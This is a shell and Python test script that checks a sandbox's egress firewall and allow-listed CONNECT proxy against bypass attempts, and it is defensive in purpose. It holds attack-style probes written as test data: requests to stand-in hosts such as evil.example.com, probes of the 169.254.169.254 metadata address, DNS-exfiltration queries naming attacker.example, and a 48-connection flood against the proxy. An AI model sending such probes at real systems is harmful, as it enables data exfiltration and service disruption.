#!/bin/sh
# O5 - Network allow-list (threat T5)
# Spec: O_TESTS_SPEC_V8.md, O5. Environment: M8_PROPOSAL_V9.md Sec. 5.2, Sec. 5.3.
# Runs as UID 1001 inside the sandbox. The harness invokes it via the
# Sec. 4.2 sandbox command. NOT YET EXECUTED - written for review only.
#
# Purpose: verify egress is blocked except through the allow-listed proxy,
# and that the proxy cannot be bypassed. The proxy is egress-proxy.py
# with the single fixed reviewed source in proposal Sec. 5.3 (blocker G)
# - a CONNECT-only proxy that resolves each allow-listed host itself and
# checks every resolved IP against the deny ranges (spec V5 rule 14).
# tinyproxy is NOT used in V3: its domain filtering cannot enforce
# private-IP denial after DNS resolution.
#
# PASS: (a) direct egress fails with EXACTLY curl exit code 28; (b)
# non-allow-listed host via proxy fails with EXACTLY HTTP 403; (c)
# allow-listed registry via proxy SUCCEEDS with EXACTLY HTTP 200; (d)
# private/link-local/loopback via proxy fails with EXACTLY HTTP 403 for
# each destination; (e) exact-host evasion via proxy fails with EXACTLY
# HTTP 403 for each evasion; (f) the accepted substitute (see below):
# (f1) the proxy returns the redirect UN-FOLLOWED (a 3xx response) and
# (f2) the private redirect target is refused with EXACTLY HTTP 403 -
# or (f1) returns 200 (the target issued no redirect), in which case (f)
# still passes on (f2) plus the configuration-based no-follow
# (egress-proxy.py is CONNECT-only: it only tunnels, it cannot follow
# redirects - any follow-up request is checked independently); (f3) the
# resolved-IP test: the allow-listed hostname o5-test-private.invalid,
# resolving to a loopback IP, is refused with EXACTLY HTTP 403;
# (g) DNS exfiltration fails by TIMEOUT on both UDP and TCP.
# (h) Proxy concurrency cap (Revision 12, spec rule 40): the proxy
# refuses connection 17+ with exactly HTTP 503 while 16 slow
# connections are held, its thread count stays <= 18, and it still
# answers a non-allow-listed CONNECT with exactly 403 after the
# load drains - proving the hard worker cap (egress-proxy.py
# Revision 5, MAX_WORKERS=16) holds under adversarial load.
# FAIL: (a) returns any HTTP response, or any curl exit code other than
# 28; (b), (d), (e), (f2), or (f3) returns 2xx, or any HTTP error other
# than exactly 403; (c) fails or returns anything other than exactly 200;
# (g) receives a DNS response; (h) refuses fewer than 30 of 48
# concurrent connections, holds more than 16, runs more than 18
# threads, or fails the post-drain 403.
# INCONCLUSIVE (exit 2): the script errors, times out, or the proxy log
# does not record the attempts. A proxy request with any HTTP status
# other than exactly 403 (and not 2xx), or a transport failure, is
# INCONCLUSIVE. A DNS refused/unreachable error is INCONCLUSIVE.
# (h) is INCONCLUSIVE if the proxy PID cannot be found (the thread
# count cannot be measured) or the probe itself errors.
#
# Exit: 0 = PASS, 1 = FAIL, 2 = error/inconclusive.
# Result line: O5_RESULT=PASS | FAIL | INCONCLUSIVE
#
# Exact-response rule (spec V5 rule 8): for a request THROUGH the proxy,
# the specified denial is exactly HTTP 403. Any other 4xx/5xx is
# INCONCLUSIVE, never a pass. A transport failure (curl non-zero, HTTP
# 000) is INCONCLUSIVE. A 2xx is FAIL. For a DIRECT request, the
# specified block is the iptables DROP, whose exact observable is curl
# exit code 28. Any other curl exit code is INCONCLUSIVE; any HTTP
# response is FAIL.
#
# KNOWN LIMITATION - sub-check (f), redirect to a private address:
# no end-to-end redirect to a private address is exercised, because no
# public URL on an allow-listed host redirects to a private address.
# O5(f) is the CONDITIONALLY ACCEPTED SUBSTITUTE (spec V5 ruling 1):
# (f1) the proxy returns the redirect un-followed, plus (f2) the private
# redirect target refused directly, plus the per-request destination
# checks of (d) and the configuration-based no-follow (egress-proxy.py
# is CONNECT-only and has no redirect-following capability). The
# end-to-end redirect case is recorded as NOT EXERCISED in the output,
# not as passed. The harness ALSO verifies from the proxy log that (f1)
# produced a single request entry (no second request made by the proxy)
# - see O_TESTS_README.md.
#
# HARNESS HALF (implemented, not described - blocker G, 2026-11-25
# ~22:39 PKT; corrected 2026-11-25 ~23:04 PKT; log isolation +
# whole-sequence trap in code 2026-11-25 ~23:30 PKT): the fixture
# setup and the proxy-log verification are the implemented harness
# script o05_harness.sh (same directory), in three modes. The whole
# O5 sequence is driven by run_batch.sh (vm mode) inside a subshell
# with `trap 'o05_harness.sh post' EXIT` in code, so post runs on
# every exit path; and post greps only the proxy-log lines written
# after the marker setup recorded, so entries from earlier tests
# cannot contaminate the (f3)/(f1) counts:
#   o05_harness.sh setup - run by the harness (root) BEFORE pre:
#     ADDS both test-only entries (the /etc/hosts entry resolving
#     o5-test-private.invalid to 127.0.0.1, and the anchored
#     test-only line in /opt/proxy/filter), idempotently, and records
#     the production allow-list SHA-256. In V5 this script only
#     VERIFIED entries the harness was described as adding; the
#     addition is now an implemented mode, not a described step.
#   o05_harness.sh pre   - run by the harness (root) BEFORE this script:
#     verifies the test-only allow-list entry exists in
#     /opt/proxy/filter, the /etc/hosts entry resolving
#     o5-test-private.invalid to 127.0.0.1 exists, and records the
#     production allow-list SHA-256. If pre fails, O5 cannot run.
#     Pre does NOT add anything - setup does that.
#   o05_harness.sh post  - run by the harness (root) AFTER this script:
#     greps the proxy log for the (f3) request and requires the denial
#     reason resolved-private-ip (exactly one entry for that host, so
#     the proxy made no second request); verifies (f1) produced a
#     single proxy-log entry for github.com (no redirect followed by
#     the proxy); removes both test-only entries; re-verifies the
#     production allow-list SHA-256. Cleanup is guaranteed on every
#     exit path: post installs `trap cleanup_entries EXIT`, and the
#     harness runs post under its own trap around the whole O5
#     sequence, so post runs even if pre or this script fails. O5
#     passes only if this workload script PASSES and all three
#     harness modes exit 0. The proxy log must show the allowed and
#     denied requests, each as a separate entry with its own
#     allow/deny decision; if the log does not record the attempts,
#     O5 is INCONCLUSIVE.
#
# The proxy port comes from $PROXY_PORT (set by the harness); default 3128
# (egress-proxy.py LISTEN_PORT).
set -u

FAIL=0
INCONCLUSIVE=0
PROXY_PORT=${PROXY_PORT:-3128}

# Sanity: this test is only meaningful as the workload user.
if [ "$(id -u 2>/dev/null)" != "1001" ]; then
    echo "O5_ERROR=not running as UID 1001 (got $(id -u 2>/dev/null || echo unknown))"
    echo "O5_RESULT=INCONCLUSIVE"
    exit 2
fi

for _tool in curl python3; do
    if ! command -v "$_tool" >/dev/null 2>&1; then
        echo "O5_ERROR=required tool missing: $_tool"
        echo "O5_RESULT=INCONCLUSIVE"
        exit 2
    fi
done

# proxy_check <url> <label>
# Sets _proxy_outcome to one of: denied | allowed | inconclusive.
# Prints O5_PROXY <label> <outcome> [code=<http_code>].
# denied = exactly HTTP 403. allowed = any 2xx. inconclusive = transport
# failure, HTTP 000, or any other 4xx/5xx (spec V5 rule 8).
proxy_check() {
    _url=$1
    _label=$2
    _code=$(curl -s -m 10 -o /dev/null -w '%{http_code}' \
        -x "http://127.0.0.1:${PROXY_PORT}" "$_url" 2>/dev/null)
    _rc=$?
    if [ "$_rc" -ne 0 ] || [ "$_code" = "000" ]; then
        echo "O5_PROXY label=$_label outcome=inconclusive rc=$_rc code=$_code"
        _proxy_outcome=inconclusive
    elif [ "$_code" = "403" ]; then
        echo "O5_PROXY label=$_label outcome=denied code=403"
        _proxy_outcome=denied
    elif [ "${_code#2}" != "$_code" ]; then
        echo "O5_PROXY label=$_label outcome=allowed code=$_code"
        _proxy_outcome=allowed
    else
        echo "O5_PROXY label=$_label outcome=inconclusive code=$_code"
        _proxy_outcome=inconclusive
    fi
}

# (a) Direct egress without the proxy must fail with EXACTLY curl exit
# code 28 (the DROP timeout). --resolve pins example.com:443 to an IP
# literal, so this tests the firewall, not DNS. Unset the proxy
# variables AND use --noproxy, so curl cannot silently fall back to
# the proxy.
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY
_code=$(curl -s -m 10 --noproxy '*' --resolve example.com:443:93.184.216.34 \
    -o /dev/null -w '%{http_code}' https://example.com 2>/dev/null)
_rc=$?
if [ "$_rc" -eq 28 ]; then
    echo "O5_DIRECT result=blocked rc=28"
elif [ "$_rc" -eq 0 ]; then
    echo "O5_DIRECT result=allowed code=$_code"
    FAIL=1
else
    echo "O5_DIRECT result=inconclusive rc=$_rc code=$_code"
    INCONCLUSIVE=1
fi

# (b) Non-allow-listed host through the proxy must be denied (exactly 403).
proxy_check https://evil.example.com non-allowlisted
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac

# (c) Allow-listed registry through the proxy must SUCCEED with exactly
# HTTP 200. If it fails, the legitimate path is broken - FAIL, not pass.
_code=$(curl -s -m 15 -o /dev/null -w '%{http_code}' \
    -x "http://127.0.0.1:${PROXY_PORT}" https://registry.npmjs.org/ 2>/dev/null)
_rc=$?
if [ "$_rc" -eq 0 ] && [ "$_code" = "200" ]; then
    echo "O5_ALLOWLISTED result=allowed code=$_code"
else
    echo "O5_ALLOWLISTED result=failed rc=$_rc code=$_code"
    FAIL=1
fi

# (d) Private / link-local / loopback destinations through the proxy must
# be denied (exactly 403) - including the metadata service.
proxy_check http://169.254.169.254/ private-metadata
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac
proxy_check http://127.0.0.1:8080/ private-loopback
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac
proxy_check http://10.0.0.1/ private-rfc1918
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac

# (e) Exact-host-match evasion through the proxy must be denied (exactly 403).
proxy_check https://evil-github.com/ evasion-evil-github
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac
proxy_check https://github.com.evil.example/ evasion-suffix
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac

# (f) Redirect handling - the accepted substitute (see header).
# (f1) Request WITHOUT -L: the proxy must return the redirect
# UN-FOLLOWED (a 3xx response to the client). A 200 means the target
# issued no redirect; that is recorded, and (f) then rests on (f2)
# plus the configuration-based no-follow.
_f1_code=$(curl -s -m 15 -o /dev/null -w '%{http_code}' \
    -x "http://127.0.0.1:${PROXY_PORT}" https://github.com 2>/dev/null)
_f1_rc=$?
echo "O5_REDIRECT_FOLLOW rc=$_f1_rc code=${_f1_code:-unknown}"
# (f2) The private redirect target, requested through the proxy directly
# (the independent re-check the proxy must apply to a follow-up request).
proxy_check http://169.254.169.254/ redirect-target-private
_f2_outcome=$_proxy_outcome
if [ "$_f2_outcome" = "allowed" ]; then
    echo "O5_REDIRECT result=target_allowed"
    FAIL=1
elif [ "$_f2_outcome" = "inconclusive" ]; then
    echo "O5_REDIRECT result=inconclusive"
    INCONCLUSIVE=1
elif [ "$_f1_rc" -ne 0 ] || [ "$_f1_code" = "000" ]; then
    echo "O5_REDIRECT result=inconclusive f1_transport_failure"
    INCONCLUSIVE=1
elif [ "${_f1_code#3}" != "$_f1_code" ]; then
    echo "O5_REDIRECT result=denied redirect_returned_unfollowed code=$_f1_code"
elif [ "$_f1_code" = "200" ]; then
    echo "O5_REDIRECT result=passed_on_f2_no_redirect_issued code=200 note=config_nofollow"
else
    echo "O5_REDIRECT result=inconclusive f1_code=$_f1_code"
    INCONCLUSIVE=1
fi
echo "O5_REDIRECT_END_TO_END result=NOT_EXERCISED"

# (f3) Resolved-IP test (spec V5 rule 14, blocker G): request the
# allow-listed hostname o5-test-private.invalid through the proxy. The
# harness script o05_harness.sh setup ADDS the test-only allow-list
# entry AND an /etc/hosts entry resolving it to 127.0.0.1 BEFORE O5,
# and o05_harness.sh post removes them immediately after (the
# production allow-list hash is re-verified before any case runs;
# cleanup is guaranteed on every exit path by traps). The proxy resolves the host itself and must refuse with
# exactly HTTP 403 because the resolved IP is loopback, even though
# the hostname is allow-listed - proving the resolved-IP check, not
# just hostname filtering. This script only makes the request and
# checks the code; it does not add or remove any allow-list entry.
proxy_check https://o5-test-private.invalid/ resolved-ip-loopback
case "$_proxy_outcome" in
    denied) : ;;
    allowed) FAIL=1 ;;
    inconclusive) INCONCLUSIVE=1 ;;
esac

# (g) DNS-exfiltration query from the workload UID. Raw UDP and TCP
# queries to 169.254.169.254:53 with a 5 s timeout (spec V5 rule 9).
# Timeout = blocked (PASS). A response = FAIL. Refused/unreachable =
# INCONCLUSIVE. The Python probe exits 0 = timeout, 1 = response,
# 2 = refused/unreachable/other error.
dns_check() {
    _proto=$1
    _qname=$2
    _label=$3
    _out=$(python3 - "$_proto" "$_qname" <<'PYEOF'
import socket, struct, sys
proto = sys.argv[1]
qname = sys.argv[2]
host = "169.254.169.254"
port = 53
def build(qname):
    hdr = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    q = b""
    for label in qname.split("."):
        b = label.encode()
        q += bytes([len(b)]) + b
    q += b"\x00" + struct.pack(">HH", 1, 1)
    return hdr + q
pkt = build(qname)
try:
    if proto == "udp":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(pkt, (host, port))
        try:
            data, _ = s.recvfrom(2048)
        except socket.timeout:
            print("timeout")
            sys.exit(0)
        print("response bytes=%d" % len(data))
        sys.exit(1)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((host, port))
        except socket.timeout:
            print("timeout")
            sys.exit(0)
        # Connected: a DNS path exists, whether or not a reply follows.
        print("connected")
        sys.exit(1)
except socket.timeout:
    print("timeout")
    sys.exit(0)
except OSError as e:
    print("error errno=%s %s" % (e.errno, e))
    sys.exit(2)
PYEOF
)
    _rc=$?
    if [ "$_rc" -eq 0 ]; then
        echo "O5_DNS_EXFIL label=$_label proto=$_proto result=blocked_timeout detail=$_out"
    elif [ "$_rc" -eq 1 ]; then
        echo "O5_DNS_EXFIL label=$_label proto=$_proto result=response detail=$_out"
        FAIL=1
    else
        echo "O5_DNS_EXFIL label=$_label proto=$_proto result=inconclusive detail=$_out"
        INCONCLUSIVE=1
    fi
}

dns_check udp exfil-0123456789abcdef.attacker.example dns-exfil
dns_check tcp exfil-0123456789abcdef.attacker.example dns-exfil

# (h) Proxy concurrency cap (Revision 12, spec rule 40). Open 48
# concurrent connections to the proxy, each sending a partial
# request line (no CRLF) and holding it, so each accepted connection
# occupies one proxy worker thread. With MAX_WORKERS=16 the proxy
# must refuse the excess with exactly HTTP 503, run at most 18
# threads (16 workers + main + slack), and still answer a
# non-allow-listed CONNECT with exactly 403 after the load drains.
# The Python probe exits 0 = cap holds, 1 = cap violated,
# 2 = proxy PID not found or probe error (INCONCLUSIVE).
_proxy_pid=$(pgrep -u 1002 -f egress-proxy.py 2>/dev/null | head -1)
if [ -z "$_proxy_pid" ]; then
    echo "O5_CONCURRENCY result=inconclusive detail=proxy_pid_not_found"
    INCONCLUSIVE=1
else
    _conc_out=$(python3 - "$PROXY_PORT" "$_proxy_pid" <<'PYEOF'
import socket, sys, threading, time
port = int(sys.argv[1]); pid = sys.argv[2]
N = 48; MAXW = 16
def threads(pid):
    try:
        for line in open("/proc/%s/status" % pid):
            if line.startswith("Threads:"):
                return int(line.split()[1])
    except OSError:
        return -1
    return -1
stop = threading.Event()
results = {}
def one(i):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8.0)
    try:
        s.connect(("127.0.0.1", port))
        s.sendall(b"CONNECT github.com:443 HTTP/1.1")
        try:
            data = s.recv(1024)
            if data.startswith(b"HTTP/1.1 503"):
                results[i] = "refused-503"
            elif data:
                results[i] = "other"
            else:
                results[i] = "closed"
        except socket.timeout:
            results[i] = "held"
        while not stop.is_set():
            time.sleep(0.05)
    except OSError:
        results[i] = "connect-failed"
    finally:
        try:
            s.close()
        except OSError:
            pass
ts = [threading.Thread(target=one, args=(i,), daemon=True) for i in range(N)]
for t in ts:
    t.start()
time.sleep(4.0)
refused = sum(1 for v in results.values() if v == "refused-503")
other = sum(1 for v in results.values() if v not in ("held", "refused-503"))
held = N - refused - other
nth = threads(pid)
alive = True
try:
    open("/proc/%s/status" % pid).close()
except OSError:
    alive = False
stop.set()
for t in ts:
    t.join(timeout=5)
time.sleep(2.0)
drained = threads(pid)
post = "unknown"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect(("127.0.0.1", port))
    s.sendall(b"CONNECT evil.example:443 HTTP/1.1\r\nHost: evil.example:443\r\n\r\n")
    data = s.recv(1024)
    post = "403" if data.startswith(b"HTTP/1.1 403") else "other"
    s.close()
except OSError:
    post = "connect-failed"
print("attempted=%d held=%d refused_503=%d other=%d proxy_threads=%d alive=%s drained_threads=%d post_drain=%s" % (N, held, refused, other, nth, alive, drained, post))
ok = (held <= MAXW and refused >= 30 and 0 < nth <= MAXW + 2 and alive
      and 0 < drained <= 2 and post == "403")
sys.exit(0 if ok else 1)
PYEOF
)
    _conc_rc=$?
    echo "O5_CONCURRENCY $_conc_out"
    if [ "$_conc_rc" -eq 0 ]; then
        echo "O5_CONCURRENCY result=cap_holds"
    elif [ "$_conc_rc" -eq 1 ]; then
        echo "O5_CONCURRENCY result=cap_violated"
        FAIL=1
    else
        echo "O5_CONCURRENCY result=inconclusive rc=$_conc_rc"
        INCONCLUSIVE=1
    fi
fi

if [ "$INCONCLUSIVE" -gt 0 ]; then
    echo "O5_RESULT=INCONCLUSIVE"
    exit 2
fi
if [ "$FAIL" -gt 0 ]; then
    echo "O5_RESULT=FAIL"
    exit 1
fi
echo "O5_RESULT=PASS"
exit 0
